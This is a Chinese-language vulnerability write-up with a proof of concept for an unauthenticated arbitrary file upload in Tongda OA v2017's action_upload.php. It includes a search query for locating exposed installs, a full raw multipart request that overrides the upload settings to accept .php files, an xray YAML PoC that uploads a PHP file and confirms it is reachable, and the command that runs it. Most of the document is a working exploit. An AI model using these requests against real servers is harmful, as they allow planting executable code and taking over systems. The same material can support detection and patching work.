# 通达OA v2017 action_upload.php 任意文件上传漏洞
## 漏洞描述

通达OA v2017 action_upload.php 文件过滤不足且无需后台权限，导致任意文件上传漏洞
## 影响版本
```
通达OA v2017
```

## 网络测绘
```
app="TDXK-通达OA"
```

## 环境搭建

-
## 漏洞复现
![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309202014829.png)


## 数据包
```
POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 893
Content-Type: multipart/form-data; boundary=---------------------------55719851240137822763221368724
X_requested_with: XMLHttpRequest
Accept-Encoding: gzip

-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileFieldName]"

ffff
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileMaxSize]"

1000000000
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[filePathFormat]"

tmdd
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"

.php
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="ffff"; filename="testtt.php"
Content-Type: application/octet-stream

4297f44b13955235245b2497399d7a93
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="mufile"

submit
-----------------------------55719851240137822763221368724--
```

## YAML代码
```
name: poc-yaml-tongda-v2017-action-upload-uploadfile
manual: true
transport: http
set:
  rand1: randomLowercase(12)
  rand2: randomLowercase(8)
  md5str: md5(string(rand2))
  rboundary: randomLowercase(8)
rules:
  r0:
    request:
      method: POST
      path: /module/ueditor/php/action_upload.php?action=uploadfile
      headers:
        Content-Type: multipart/form-data; boundary=----------WebKitFormBoundary{{rboundary}}
      body: "\
        ------------WebKitFormBoundary{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"CONFIG[fileFieldName]\"\r\n\
        \r\n\
        ffff\r\n\
        ------------WebKitFormBoundary{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"CONFIG[fileMaxSize]\"\r\n\
        \r\n\
        1000000000\r\n\
        ------------WebKitFormBoundary{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"CONFIG[filePathFormat]\"\r\n\
        \r\n\
        {{rand1}}\r\n\
        ------------WebKitFormBoundary{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"CONFIG[fileAllowFiles][]\"\r\n\
        \r\n\
        .php\r\n\
        ------------WebKitFormBoundary{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"ffff\"; filename=\"{{rand1}}.php\"\r\n\
        Content-Type: application/octet-stream\r\n\
        \r\n\
        {{md5str}}\r\n\
        ------------WebKitFormBoundary{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"mufile\"\r\n\
        \r\n\
        submit\r\n\
        ------------WebKitFormBoundary{{rboundary}}--\r\n\
        "
    expression: response.status == 200
  r1:
    request:
      method: GET
      path: /{{rand1}}.php
    expression: response.status == 200 && response.body.bcontains(bytes(substr(md5(string(rand2)), 2, 29)))
expression: r0() && r1()
detail:
  author: klear
  links:
    - https://vuls.info/PeiQi/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2017%20action_upload.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/?h=action

```

## xray调用

```
xraypro  ws --poc yaml/poc-yaml-tongda-v2017-action-upload-uploadfile.yml --url xx
```

![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309202030629.png)
